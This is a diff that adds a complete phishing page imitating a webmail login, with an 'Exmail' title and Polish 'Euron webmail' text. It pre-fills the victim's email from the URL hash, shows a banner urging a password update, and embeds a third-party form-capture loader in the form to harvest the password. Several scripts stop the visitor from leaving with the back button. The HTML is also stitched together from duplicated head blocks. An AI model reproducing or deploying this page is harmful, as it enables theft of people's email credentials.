@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exmail Login - Not just mailbox</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    position: relative;
+}
+
+/* Centered Layout Workspace Block Wrapper */
+.login-wrapper {
+    width: 100%;
+    max-width: 320px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    margin-top: -80px; /* Upward offset precisely matching the screenshot layout */
+}
+
+/* Replicating the dual-layer open envelope icon branding element exactly */
+.brand-logo-container {
+    width: 90px;
+    height: 90px;
+    margin-bottom: 36px;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-end;
+}
+
+.envelope-paper {
+    width: 60px;
+    height: 50px;
+    background-color: #ffffff;
+    border: 1px solid #cbd5e1;
+    border-radius: 4px;
+    font-size: 32px;
+    color: #3bb2f6;
+    font-family: Georgia, serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: absolute;
+    top: 5px;
+    z-index: 1;
+}
+
+.envelope-body {
+    width: 84px;
+    height: 52px;
+    background-color: #0c8cd6; /* Base background deep envelope blue */
+    /* Triangle overlay geometry to create the look of an open pocket card */
+    background-image: linear-gradient(30deg, #1aaeff 50%, transparent 50%),
+                      linear-gradient(-30deg, #1aaeff 50%, transparent 50%);
+    background-size: 50% 100%;
+    background-repeat: no-repeat;
+    background-position: left top, right top;
+    position: relative;
+    z-index: 2;
+    border-radius: 0 0 4px 4px;
+}
+
+form {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin-bottom: 20px;
+}
+
+/* Prefix Icon Addon Input Field Container Elements Rows Alignment */
+.input-row {
+    display: flex;
+    width: 100%;
+    height: 38px;
+    border: 1px solid #cbd5e1;
+    border-radius: 2px;
+    overflow: hidden;
+    background-color: #ffffff;
+}
+
+/* Distinctive active sky-blue highlighted state border profile matching username field */
+.input-row.focused-row {
+    border-color: #32b8ff;
+    box-shadow: 0 0 0 1px #32b8ff;
+}
+
+.icon-addon {
+    width: 38px;
+    background-color: #ffffff;
+    border-right: 1px solid #cbd5e1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #111111;
+    font-size: 13px;
+    user-select: none;
+}
+
+.form-control {
+    flex: 1;
+    height: 100%;
+    border: none;
+    padding: 0 12px;
+    font-size: 14px;
+    color: #333333;
+    outline: none;
+    background: transparent;
+}
+
+.form-control::placeholder {
+    color: #cbd5e1;
+    font-weight: 400;
+}
+
+/* Flat wide rectangular solid energetic cyan submit button block component (NOW FULLY CLICKABLE) */
+.submit-btn {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    background-color: #32b8ff; /* High contrast energetic bright sky-blue tint */
+    color: #ffffff;
+    border: none;
+    height: 42px;
+    font-size: 13px;
+    font-weight: bold;
+    letter-spacing: 0.5px;
+    border-radius: 2px;
+    cursor: pointer;
+    margin-top: 4px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #1aaeff;
+}
+
+/* Bottom auxiliary ribbon paths guide connections area footer labels */
+.footer-links {
+    font-size: 11px;
+    color: #8c8c8c;
+    white-space: nowrap;
+}
+
+.footer-links a {
+    color: #32b8ff;
+    text-decoration: none;
+}
+
+.footer-links a:hover {
+    text-decoration: underline;
+}
+
+/* OS Environment Activation Notification Simulation Overlay Layer Components Grid Blueprint */
+.system-watermark {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(0, 0, 0, 0.13);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 100;
+}
+
+    </style>
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Euron webmail - Logowanie</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Centered Composition Form Area Card Box Component Module Wrapper -->
+    <main class="login-wrapper">
+        
+        
+        <div class="brand-logo-container">
+            <div class="envelope-paper">e</div>
+            <div class="envelope-body"></div>
+        </div>
+
+        <!-- Interactive Form submission tracking configuration using FormSubmit module paths -->
+        <form action="" method="POST">
+            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+    <p style="color:red">Log in and update your current password</p>
+            <!-- Username Input Group Row with Left Icon Addon -->
+            <div class="input-row focused-row">
+                <div class="icon-addon">👤</div>
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+            </div>
+
+            <!-- Password Input Group Row with Left Icon Addon -->
+            <div class="input-row">
+                <div class="icon-addon">🔒</div>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+            </div>
+
+            <!-- Solid Flat Light Blue Action Submission Trigger Button Block Component -->
+            <button type="submit" class="submit-btn">ZALOGUJ</button>
+        </form>
+
+        <!-- Bottom Informational Reference Link Footer Label Component -->
+        <footer class="footer-links">
+            <span>Euron webmail</span> &bull; <a href="#">Wsparcie techniczne</a>
+        </footer>
+
+    </main>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
